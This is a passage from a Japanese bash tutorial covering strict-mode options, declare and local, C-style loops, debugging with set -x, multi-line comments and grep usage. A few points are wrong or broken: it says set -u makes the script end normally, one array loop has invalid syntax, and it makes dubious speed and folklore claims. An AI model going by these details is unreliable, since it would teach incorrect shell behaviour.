</span><span class=cp></span>
<span class=nb>set</span> -ueo pipefail
</code></pre></div><p><code>set -u</code> : 未定義の変数を使用した箇所でスクリプトが正常終了します。変数名が異なる場合も実行できてしまうなどのありがちがバグを未然に防ぐことができます。</p>
<p><code>set -e</code> : スクリプトの実行中にエラーが発生した場合、エラーの箇所でスクリプトの処理が終了します。通常は、エラーが発生しても実行は中断されず、エラー箇所を特定するのはとても大変ですが、<code>set -e</code> オプションを付けておくとエラー箇所の特定が比較的カンタンになります。</p>
<p><code>set -o pipefail</code> : コマンド同士の連結にパイプ「｜」を使いますが、パイプ箇所でエラーが発生した場合に、パイプで連結したどのコマンドでエラーが発生したのかを特定することができます。</p>
<p>上記３つのオプションを結合すると <code>set -ueo pipefail</code>をなります。通常、行頭のシェバン「#!/usr/bin/bash 」の下に一行空行を置き、その下に <code>set -ueo pipefail</code>を書くと良いです。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>とはいいつつ、このオプションを有効にすると、制限がかかるので、最初のうちはオプションを使わずにプログラムを書いて、動くことが確認できたらオプションを有効にして、プログラムが想定通りに動かなかったら、なにがだめだったのかを検証するということを繰り返すことで、しっかりとしたプログラムが書けるようになります。</dd>
</dl>
</div>
<h3 id=変数の型を指定する>変数の型を指定する</h3>
<p>シェルスクリプトでは変数の型を指定する必要はありませんが、指定しておくことで、間違った値を代入することがなくなり、しいてはバグが減ります。</p>
<p>変数を数値として宣言する<br>
iオプションを使用します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>declare</span> -i <span class=nv>num</span><span class=o>=</span>1+2
<span class=nv>str</span><span class=o>=</span>1+2

<span class=nb>echo</span> <span class=nv>$num</span> <span class=c1># =&gt; 3</span>
<span class=nb>echo</span> <span class=nv>$str</span> <span class=c1># =&gt; 1+2</span>
</code></pre></div><p>変数を配列として宣言する<br>
aオプションを使用します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>declare</span> -a <span class=nv>array</span><span class=o>=(</span> Java Ruby Python <span class=o>)</span>

<span class=nb>echo</span> <span class=si>${</span><span class=nv>array</span><span class=p>[0]</span><span class=si>}</span> <span class=c1># =&gt; Java</span>

<span class=nb>echo</span> <span class=si>${#</span><span class=nv>array</span><span class=p>[*]</span><span class=si>}</span> <span class=c1>#=&gt; 3(配列の要素数)</span>

<span class=k>for</span> e in <span class=si>${</span><span class=nv>array</span><span class=p>[*]</span><span class=si>}</span>
<span class=k>do</span>
  <span class=nb>echo</span> <span class=nv>$e</span> <span class=c1># =&gt; Java, Ruby, Pythonの順に出力</span>
<span class=k>done</span>

<span class=k>for</span> i in <span class=si>${</span><span class=p>!array{*</span><span class=si>}</span><span class=o>}</span>
<span class=k>do</span>
  <span class=nb>echo</span> <span class=si>${</span><span class=nv>array</span><span class=p>[i]</span><span class=si>}</span> <span class=c1># =&gt; Java, Ruby, Pythonの順位出力</span>
<span class=k>done</span>
</code></pre></div><p>変数を定数（読み取り専用）とし、初期化時に値を代入する<br>
-r オプションを使います。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=nb>set</span> -ueo pipefail

<span class=nb>declare</span> -r <span class=nv>num</span><span class=o>=</span>5<span class=p>;</span>

<span class=nv>str</span><span class=o>=</span><span class=k>$((</span>num+2<span class=k>))</span><span class=p>;</span>
<span class=nb>echo</span> <span class=nv>$num</span> <span class=c1># =&gt; 5</span>
<span class=nb>echo</span> <span class=nv>$str</span> <span class=c1># =&gt; 7</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>プログラムを動作させるための固定値（処理中に変更の必要のない値）は declare -r をつけておくと、バグとなる心配が少し減ります。なぜ変更の必要がないのかということも併せてコメントに追記しておくと、良いと思います。</dd>
</dl>
</div>
<h3 id=ローカル変数を定義する>ローカル変数を定義する</h3>
<p>シェルスクリプトはどこで宣言しようとすべてグローバル変数として扱われますが、<code>local</code>をつけることによって、明示的にもローカル変数を定義することができます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>function</span> fn<span class=o>()</span> <span class=o>{</span>
  <span class=c1># 問題のある例:</span>
  <span class=nb>local</span> <span class=nv>hoge</span><span class=o>=</span><span class=k>$(</span><span class=nb>false</span><span class=k>)</span>
  <span class=c1># $? で直前に実行したコマンドの終了ステータスを参照できる</span>
  <span class=nb>echo</span> <span class=nv>$?</span> <span class=c1># =&gt; エラーが握りつぶされ 0 が返る！</span>
 
  <span class=c1># 問題のない例:</span>
  <span class=nb>local</span> hoge2
  <span class=nv>hoge2</span><span class=o>=</span><span class=k>$(</span><span class=nb>false</span><span class=k>)</span>
  <span class=nb>echo</span> <span class=nv>$?</span> <span class=c1># =&gt; 正しく 1 が返る</span>
<span class=o>}</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>local</code> は関数の中でしか使わない局所的な変数に使います。<br>
<code>local</code> を付けることで「他の関数では使わない」という意識が明確になるので、平たいわかりやすいプログラムを書くことができます。ローカル変数の場合は、省略せずに定義しましょう。</dd>
</dl>
</div>
<h3 id=インクリメント>インクリメント</h3>
<p>インクリメントなどは以下のように書くことができます。</p>
<p>一般的な書き方</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=nb>set</span> -ueo pipefail 

<span class=nv>value</span><span class=o>=</span>0<span class=p>;</span>
<span class=nv>value</span><span class=o>=</span><span class=sb>`</span><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$value</span><span class=s2>+1&#34;</span> <span class=p>|</span> bc<span class=sb>`</span><span class=p>;</span>
<span class=nb>echo</span> <span class=s2>&#34;valueの値は &#34;</span> <span class=nv>$value</span><span class=p>;</span>
</code></pre></div><p>スッキリとした書き方</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=nb>set</span> -uo pipefail  <span class=c1># eをつけると動きません</span>

<span class=nb>declare</span> -i <span class=nv>value</span><span class=o>=</span>0<span class=p>;</span>
<span class=o>((</span>value++<span class=o>))</span><span class=p>;</span>
<span class=nb>echo</span> <span class=s2>&#34;valueの値は&#34;</span> <span class=nv>$value</span><span class=p>;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>プログラムの文字数は少なければ少ないほどスッキリと見え、デバッグの際にバグの発見に効果的です。<br>
インクリメント一つをとっても、`(( COUNT++ )) とシンプルに書く癖をつけましょう。</dd>
</dl>
</div>
<h3 id=if-c言語やjavaのような条件式で記述する>if C言語やJavaのような条件式で記述する</h3>
<p>メリットは以下のとおりです。<br>
・半角空白を配置する必要がない<br>
・一般的に短い行で記述できるようになる<br>
・条件式の変数に「$」を付ける必要がない<br>
・-gt は >、 -lt は &lt;、-leは&lt;=、で普通に記述できる</p>
<p>一般的な記述</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=nb>set</span> -ueo pipefail

<span class=nv>x</span><span class=o>=</span>4<span class=p>;</span>
<span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$x</span><span class=s2>&#34;</span> -gt <span class=m>2</span> <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$x</span><span class=s2>&#34;</span> -le <span class=m>5</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
  <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$x</span><span class=s2> は 2 より大きいかつ 5 以下です&#34;</span><span class=p>;</span>
<span class=k>fi</span>
</code></pre></div><p>拡張した記述</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=nb>set</span> -ueo pipefail

<span class=nv>x</span><span class=o>=</span>4<span class=p>;</span>
<span class=k>if</span> <span class=o>((</span>x&gt;2 <span class=o>&amp;&amp;</span> x&lt;<span class=o>=</span>5<span class=o>))</span><span class=p>;</span> <span class=k>then</span>
  <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$x</span><span class=s2> は 2 より大きいかつ 5 以下です&#34;</span><span class=p>;</span>
<span class=k>fi</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>bash の if文は 記述が冗長になりがちです。<br>
多くのプログラミング言語共通の書き方にすることで、bash固有の記述を覚える必要も少なくなります。<br>
シンプルな記述方式を書くことをおすすめします。</dd>
</dl>
</div>
<h3 id=while-c言語やjavaのような条件式で記述する>while C言語やJavaのような条件式で記述する</h3>
<p>スッキリとした書き方</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=nb>set</span> -ueo pipefail

<span class=nb>declare</span> -i <span class=nv>i</span><span class=o>=</span>0<span class=p>;</span>
<span class=k>while</span><span class=o>((</span>i++&lt;10<span class=o>))</span><span class=p>;</span><span class=k>do</span>
  <span class=nb>echo</span> <span class=nv>$i</span><span class=p>;</span>
<span class=k>done</span>
</code></pre></div><h3 id=for-c言語やjavaのような条件式で記述する>for C言語やJavaのような条件式で記述する</h3>
<p>スッキリとした書き方</p>
<pre tabindex=0><code>#!/usr/bin/bash

set -ueo pipefail

for((i=1;i&lt;=10;i++));do
  echo $i;
done
</code></pre><p>doやdoneを使わないもっとスッキリとした書き方</p>
<pre tabindex=0><code>#!/usr/bin/bash

set -ueo pipefail

for((i=1;i&lt;=10;i++)){
  echo $i;
}
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>bash の if文同様、for文も記述が冗長になりがちです。<br>
多くのプログラミング言語共通の書き方にすることで、bash固有の記述を覚える必要も少なくなります。<br>
シンプルな記述方式を書くことをおすすめします。</dd>
</dl>
</div>
<h3 id=grepで該当文字列があったら反応する>grepで該当文字列があったら反応する</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># 一般的には以下のようにします。</span>
<span class=k>if</span> cat hoge.txt <span class=p>|</span> grep <span class=s2>&#34;Apple&#34;</span> &gt;/dev/null<span class=p>;</span> <span class=k>then</span>
  <span class=nb>echo</span> <span class=s2>&#34;hoge.txtにはAppleが含まれた行がある&#34;</span>
<span class=k>fi</span>

<span class=c1># --quiet は標準出力に何も書き出さないオプション</span>
<span class=k>if</span> cat hoge.txt <span class=p>|</span> grep --quiet <span class=s2>&#34;Apple&#34;</span><span class=p>;</span> <span class=k>then</span>
  <span class=nb>echo</span> <span class=s2>&#34;hoge.txtにはAppleが含まれた行がある&#34;</span>
<span class=k>fi</span>

<span class=c1># --quiet と &gt;/dev/null; を組み合わせて高速化する場合</span>
<span class=k>if</span> cat hoge.txt <span class=p>|</span> grep --quiet <span class=s2>&#34;Apple&#34;</span> &gt;/dev/null<span class=p>;</span> <span class=k>then</span>
  <span class=nb>echo</span> <span class=s2>&#34;hoge.txtにはAppleが含まれた行がある&#34;</span>
<span class=k>fi</span>


&lt;div <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;tips-area tips&#34;</span>&gt;
  
ヒント
: 結局、bashはCやJavaと比べて処理速度が遅いのです。 
ボトルネックの多くは、ファイルの入出力や標準出力に書き出すコストです。
<span class=sb>`</span>--quiet<span class=sb>`</span> で標準出力を抑制し、さらに /dev/null へ捨てる処理を加えることで、処理速度が高まります。 

&lt;/div&gt;



 
<span class=c1># 条件の反転は ! をつける</span>
<span class=k>if</span> ! cat hoge.txt <span class=p>|</span> grep --quiet <span class=s2>&#34;Apple&#34;</span><span class=p>;</span> <span class=k>then</span>
  <span class=nb>echo</span> <span class=s2>&#34;hoge.txtにはAppleが含まれた行がない&#34;</span>
<span class=k>fi</span>
</code></pre></div><h3 id=長い行の改行について>長い行の改行について</h3>
<p>長い行の改行はバックスラッシュを末尾につける</p>
<pre tabindex=0><code>aws --region ap-northeast-1 cloudformation deploy \
  --template-file ./packaged-template.yaml \
  --stack-name example-stack \
  --capabilities CAPABILITY_IAM \
  --parameter-overrides \
    Environment=development \
    EnableDebugLog=true
</code></pre><p>驚いたことに（僕も驚きました）パイプラインでの改行はエスケープがいらないのです。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat access.log <span class=p>|</span>
  <span class=c1># IPアドレスのカラムを取得する</span>
  awk <span class=s1>&#39;{print $5}&#39;</span> <span class=p>|</span>
  <span class=c1># 100行目以降のみを集計対象とする</span>
  tail +100 <span class=p>|</span>
  <span class=c1># IPアドレスごとのアクセス数のランキングを集計する</span>
  sort <span class=p>|</span> uniq -c <span class=p>|</span> sort -nr
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>bashはコマンドをパイプで連結して処理することが最大の特徴ではありますが、プログラコードが画面の端で折り返したりして可読性が低くなりがちなことがデメリットです。<br>
おおよそ８０文字程度で改行できればよいのですが、パイプで連結していることから、どこで改行してよいやら迷いがちです。<br>
処理の中で適宜改行するために、エスケープ <code>\</code> で 改行、またはパイプのある場所で改行することをおすすめします。<br>
紹介したとおり、パイプ <code>|</code> の直後での改行にエスケープ <code>\</code> は不要です。<br>
わかりやすい可読性の高いプログラムコードを書くことを常に意識することが大切です。</dd>
</dl>
</div>
<h3 id=関数パラメータは変数に格納する>関数パラメータは変数に格納する</h3>
<p>関数に渡された値は $1,$2&mldr;というふうにアクセスできます。<br>
とはいえ、関数の中で $1,$2を使うとなにがなんだかわかりにくくなります。<br>
ですので、関数冒頭で変数に格納しましょう。<br>
もちろん忘れずに変数には<code>local</code> 変数をつけましょう。<br>
変数の型がわかっているのであれば（わかっているでしょう）、declare -i などで明示的に変数の型を指定するのが望ましいのです。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>function</span> do_something<span class=o>()</span> <span class=o>{</span>
  <span class=c1># まず最初に引数を意味のある命名の変数に取り出す</span>
  <span class=nb>local</span> target_dir<span class=p>;</span>
  <span class=nb>local</span> action

  <span class=nv>target_dir</span><span class=o>=</span><span class=nv>$1</span><span class=p>;</span>
  <span class=nv>action</span><span class=o>=</span><span class=nv>$2</span><span class=p>;</span>
<span class=o>}</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ソースコードの中に <code>$1</code> とか <code>$2</code>とか書かれても、パット見たときに、<code>$1</code>にどんな値が入っているのかわかりません。<br>
わかりやすくするために、関数の冒頭で、 `local value="$1"; のように丁寧に変数を作り代入することで、可読性が増し、それによりバグも減ります。わかりにくいコードを書くからバグの発見に時間がかかる場合が多いのです。</dd>
</dl>
</div>
<h3 id=スクリプトのデバッグ>スクリプトのデバッグ</h3>
<p>Bashは広範なデバッグ機能を提供しています。</p>
<p>デバッグの方法は３種類あります</p>
<p>１．ターミナルの実行時に -x オプションを付与する</p>
<pre tabindex=0><code>$ bash -x helloScript.sh
</code></pre><p>２．ソースコードの冒頭のシェバンに -x オプションを付与する</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:debug.sh data-lang=bash:debug.sh><span class=cp>#!/bin/bash -x
</span><span class=cp></span>:
:
</code></pre></div><p>３．デバッグの開始点と終了点を決めてデバッグ<br>
デバッグの開始点にコマンド &lsquo;set -x&rsquo;終了点には &lsquo;set +x&rsquo; と書きます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:debug2.sh data-lang=bash:debug2.sh><span class=cp>#!/bin/bash 
</span><span class=cp></span>
<span class=nb>set</span> -x
<span class=nb>echo</span> <span class=s2>&#34;置き換えたいファイル名を入寮して下さい。&#34;</span>
<span class=nb>read</span> fileName
<span class=nb>set</span> +x

<span class=k>if</span> <span class=o>[[</span> -f <span class=s2>&#34;</span><span class=nv>$fileName</span><span class=s2>&#34;</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
  sed -e <span class=s2>&#34;s/Linux/Unix/g&#34;</span> <span class=s2>&#34;</span><span class=nv>$fileName</span><span class=s2>&#34;</span><span class=p>;</span>
<span class=k>else</span>
  <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$fileName</span><span class=s2> はありません。&#34;</span><span class=p>;</span>
<span class=k>fi</span>
</code></pre></div><pre tabindex=0><code>$ bash test
+ echo 置き換えたいファイル名を入寮して下さい。
置き換えたいファイル名を入寮して下さい。
+ read fileName
grepfile.txt
+ set +x
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
$
</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:debug3.sh data-lang=bash:debug3.sh><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=c1># デバッグ開始</span>
<span class=nb>set</span> -x

<span class=nv>var1</span><span class=o>=</span><span class=sb>`</span>date +%M<span class=sb>`</span>

<span class=c1># デバッグ終了</span>
<span class=nb>set</span> +x

<span class=nv>var2</span><span class=o>=</span><span class=sb>`</span>ls -1 <span class=p>|</span> wc -l<span class=sb>`</span>
<span class=nv>var3</span><span class=o>=</span><span class=s2>&#34;DEBUG TEST&#34;</span>

<span class=nb>exit</span> <span class=m>0</span>
</code></pre></div><pre tabindex=0><code>$ bash debug3.sh
++ date +%M
+ var1=56
+ set +x
$
</code></pre><h3 id=デバッグモードのフラグを使う>デバッグモードのフラグを使う</h3>
<p>ソースの冒頭で宣言した<code>DEBUG</code>変数が TRUEのときだけ出力したいということはよくあります。<br>
逆に言えば、DEBUGモードがFALSEのときは、出力してほしくないということです。</p>
<pre tabindex=0><code class=language-:bash data-lang=:bash>#!/bin/bash

# デバッグのときは TRUE そうでないときは FALSE に
DEBUG=&quot;TRUE&quot;;

declare -i var=10;

if [ &quot;$DEBUG&quot; == &quot;TRUE&quot; ];then
  echo &quot;$var&quot; # デバッグのときだけ出力
fi

exit 0
</code></pre><pre tabindex=0><code>10
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>開発しているときは、プログラムの進捗を確認するために出力はいろいろあってもよいけど、本番稼働のときは、出力はしてほしくないときにとても便利です。</dd>
</dl>
</div>
<h3 id=マルチラインコメント>マルチラインコメント</h3>
<p>マルチラインコメントとは「複数行コメント」のことです。</p>
<p>bashではさまざまな方法で複数行コメントを使用できます。<br>
次の例に簡単な方法を示します。<br>
&lsquo;multiline-comment.sh&rsquo;という名前の新しいbashを作成し、次のスクリプトを追加します。<br>
ここでは、「:」と「'」でbashで複数行コメントを実現しています。<br>
次のスクリプトは、5の2乗を計算します。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>「:」と「'」の間は半角スペースを入れます。</dd>
</dl>
</div>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:multiline-comment.sh data-lang=bash:multiline-comment.sh><span class=cp>#!/bin/bash
</span><span class=cp></span>
: <span class=s1>&#39;
</span><span class=s1>次のスクリプトは、
</span><span class=s1>数値の2乗値5を計算します。
</span><span class=s1>&#39;</span>
<span class=o>((</span><span class=nv>area</span><span class=o>=</span>5*5<span class=o>))</span><span class=p>;</span>
<span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$area</span><span class=s2>&#34;</span><span class=p>;</span>
</code></pre></div><p>bashコマンドでファイルを実行します。</p>
<pre tabindex=0><code>$ bash multiline-comment.sh
25
$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>マルチラインコメントの存在は、ほぼ知られていません。</dd>
<dd>ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。</dd>
<dd>それは、過去のメジャーソースコードの冒頭にそうあるからです。</dd>
<dd>そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのです。</dd>
<dd>以降、紹介するファイル生成コマンド <code>touch</code> は、「:>ファイル名」で、空のファイルを生成する事ができます。</dd>
<dd>「:」は、”なにもしないことを示します。</dd>
<dd>if文の中で何もしない場合は、以下のように記述する。</dd>
<dd>
<p>if [ &ldquo;$v&rdquo; -eq 5 ];then</p>
</dd>
<dd>:</dd>
<dd>fi</dd>
<dd>
<p>なにもしない「:」がないと、ifの条件で実行される本文がないというエラーが吐き出されます。</p>
</dd>
<dd>bashでは、なにもしないという振る舞いも明確に指定する必要があるのです。</dd>
<dd>touchは既にファイルがあれば、そのファイルにはさわらない。</dd>
<dd>:> は既にファイルがあれば、そのファイルさえも空にする。</dd>
<dd>上記 if 文の中の : は　何もしないことを示す。</dd>
<dd>マルチラインコメントも同じ「:」から始まり、何もしないことを示している。</dd>
</dl>
</div>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>touch</code> コマンドは既にファイルが存在すれば、そのファイルに変更を加えません。</dd>
<dd><code>:></code> と <code>touch</code> の違いは、<code>:></code> は既にファイルがあっても、そのファイルを空にして初期化します。</dd>
</dl>
</div>
<h2 id=grep-のtips>grep のTIPS</h2>
<p>grep（グレップ）コマンド。<br>
UNIX/Linuxにおいてこれほど歴史あり、強力なコマンドはありません。<br>
そして多くのユーザーがこのコマンドを使いこなしています。<br>
Webサーバーのログから特定のユーザーのみを抽出する小さなスクリプトから、膨大なシステムログからロケットの軌道を修正するために必要な要素をリアルタイムに抽出し計算する処理プログラムなど、半世紀もの長い間、一糸乱れることなく、ありとあらゆるところで<code>grep</code>コマンドは動き続けています。</p>
<p><code>grep</code>コマンドは、文字列、またはファイル内のをテキストを検索するためのコマンドです。<br>
<code>grep</code>コマンドの正式な名称は「global regular expression print.」です。<br>
このコマンドの名前は、正規表現に基づいてコンテンツを検索できる「g / re / p」に由来しています。<br>
<code>grep</code>コマンドには、ファイル内の文字列またはテキストを検索するため、複数の方法が用意されている。<br>
以下に<code>grep</code>コマンドを使用するいくつかの構文を示します。</p>
<h3 id=カラー表示>カラー表示</h3>
<p>まず、grep コマンドをカラー表示にしてみます。<br>
以下のコマンドで、~/.bashrc を開きます。</p>
<pre tabindex=0><code>$ vim ~/.bashrc
</code></pre><p>以下の2行を ~/.bashrc に追記して保存して下さい。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:~/.bashrc data-lang=bash:~/.bashrc><span class=nb>alias</span> <span class=nv>grep</span><span class=o>=</span><span class=s1>&#39;grep --color=auto&#39;</span>
<span class=nb>alias</span> <span class=nv>egrep</span><span class=o>=</span><span class=s1>&#39;egrep --color=auto&#39;</span>
<span class=nb>alias</span> <span class=nv>fgrep</span><span class=o>=</span><span class=s1>&#39;fgrep --color=auto&#39;</span>
<span class=nb>alias</span> <span class=nv>ls</span><span class=o>=</span><span class=s1>&#39;ls -FG&#39;</span><span class=p>;</span> 
</code></pre></div><p>grep/egrep/fgrep そしてついでに lsコマンドもカラー表示に変更します。変更したら ~/.bashrcを以下のコマンドで再読込します。</p>
<pre tabindex=0><code>$ . ~/.bashrc
$ 
</code></pre><p>では、grep コマンドを使ってみます。<br>
ここでは /etc/passwordファイルをgrepしてrootを検索してみます。</p>
<pre tabindex=0><code>$ grep root /etc/password
$
</code></pre><h3 id=構文>構文</h3>
<p>次の<code>grep</code>コマンドは、ファイル内の特定の文字列またはテキストを検索するために使用されます。</p>
<pre tabindex=0><code>$ grep 検索文字列 ファイル名
</code></pre><p>次の<code>grep</code>コマンドは、複数のファイル内の特定の文字列またはテキストを検索するために使用されます。</p>
<pre tabindex=0><code>$ grep 検索文字列 filename1 filename2 filename3
$ 
</code></pre><p>次は、空白を含む文字列を検索します。この場合はシングルクォーテーション「'」、またはダブるクォーテーション「"」で文字列を囲む必要があります。</p>
<pre tabindex=0><code>$ grep &quot;検索文字列 検索文字列&quot; filename1
$ 
</code></pre><p>次の<code>grep</code>コマンドは、ファイル内の特定のオプションを含む文字列を検索するために使用されます。<br>
<code>grep</code> コマンドでは、さまざまな目的でさまざまなオプションが使用されます。<br>
ここでは「-v」を紹介します。<br>
「-v」オプションは、検索文字列を含まない行を抽出するオプションです。<br>
このオプションは、非常に多くの場面で利用されます。</p>
<pre>
$ cat /etc/passwd | head
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
bash-5.1$ cat /etc/passwd | head
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
$
bash-5.1$ cat /etc/passwd | head | grep "User"
# <font color=red>User</font> Database
$
$ cat /etc/passwd | head | grep -v "User"
##
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
$ 
</pre>
<p>まず、</p>
<pre tabindex=0><code>$ cat /etc/passwd
$
</code></pre><p>で、/etc/passwd ファイルをcat します。<br>
<code>cat</code> コマンドは、ファイル内容を出力すると言う意味になります。さらに、</p>
<pre tabindex=0><code>$ cat /etc/passwd | head 
$
</code></pre><p><code>head</code> コマンドは、出力された /etc/passwd ファイルの冒頭１０行を抽出するコマンドです。<br>
<code>head</code> コマンドに <code>-n5</code> オプションをつけることで冒頭5行目を出力することができます。</p>
<pre tabindex=0><code>$ cat /etc/passwd | head -n5
$
</code></pre><p>シェルスクリプトは、<code>|</code> パイプでコマンドを連ねることで、前のコマンドに続いて、さらにコマンドの出力結果を絞り込むことができます。<br>
次のコマンドは、/etc/passwd ファイルを <code>cat</code> コマンドで表示し、<code>head</code> コマンドで冒頭１０行を抽出、さらに <code>grep -v</code> コマンドで User を除く行を出力します。<br>
<code>head -n10</code> と明示的に出力行を指定するほうが可読性が高くなります。</p>
<pre tabindex=0><code>$ cat /etc/passwd | head | grep -v &quot;User&quot;
</code></pre><p><code>grep -v</code> コマンドは、指定した文字列を含まない行を抽出するという意味です。<br>
-v をつけなければ、User という文字列を含む文字列が抽出されることになります。<br>
さらにgrepには強力な <code>-i</code> オプションがあります。<br>
<code>-i</code> オプションは、検索文字列の大文字、小文字を区別せずに抽出します。</p>
<pre><font color=white>
bash-3.2$ cat /etc/passwd | head | grep -i "user"
# <font color=red>User</font> Database
# in single-<font color=red>user</font> mode.  At other times this information is provided by
bash-3.2$
</font color=white></pre>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>grep コマンドで最も使われる書式は</dd>
<dd>$ cat &lt;ファイル名> | grep &ldquo;検索文字列"です。</dd>
<dd>以下、'-v&rsquo; &lsquo;-i&rsquo; 二つのオプションをパイプで駆使すればgrepコマンドを使いこなしていると言っても過言ではありません。</dd>
<dd>
<p>-v 除外</p>
</dd>
<dd>$ cat &lt;ファイル名> | grep -v &ldquo;検索文字列&rdquo;</dd>
<dd>
<p>-i 大文字小文字を区別しない</p>
</dd>
<dd>$ cat &lt;ファイル名> | grep -i &ldquo;検索文字列&rdquo;</dd>
</dl>
</div>
<h3 id=一致する文字列を検索>一致する文字列を検索</h3>
<p>では手始めに、次のコマンドで、Customers.txtファイルの内容を表示します。以下の内容をCustomers.txtとして保存して下さい。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:Customers.txt data-lang=bash:Customers.txt>ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
</code></pre></div><p>Customers.txtを表示します。</p>
<pre tabindex=0><code>$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
</code></pre><p>次の<code>grep</code>コマンドは、Customers.txtファイルのテキスト「Ali」を含む語句の検索をします。検索テキストがファイルに存在する場合、テキストを含む行が出力されます。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep Ali
45  Minhaz <font color=red>Ali</font>      ali@gmail.com       +8801190761212
$
</pre>
<p>次の<code>grep</code>コマンドは、Customers.txtファイルのテキスト「 MalihaChowdhury 」を検索します。検索テキストがファイルに存在する場合、テキストを含む行が出力されます。</p>
<pre>
$ cat Customers.txt | grep 'Maliha Chowdhury'
56  <font color=red>Maliha Chowdhury</font>    maliha@gmail.com        +8801820001980
$
</pre>
<h3 id=一致しない文字列のみを検索>一致しない文字列のみを検索</h3>
<p><code>grep</code>コマンドの -v オプションは、ファイルから一致しない文字列を検索するために使用されます。<br>
この例では、-vオプションを指定した<code>grep</code>コマンドを使用して、最初の例で作成したCustomers.txtファイルから一致しない文字列を検索しています。<br>
次のコマンドは、customers.txtファイルの内容を表示します。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
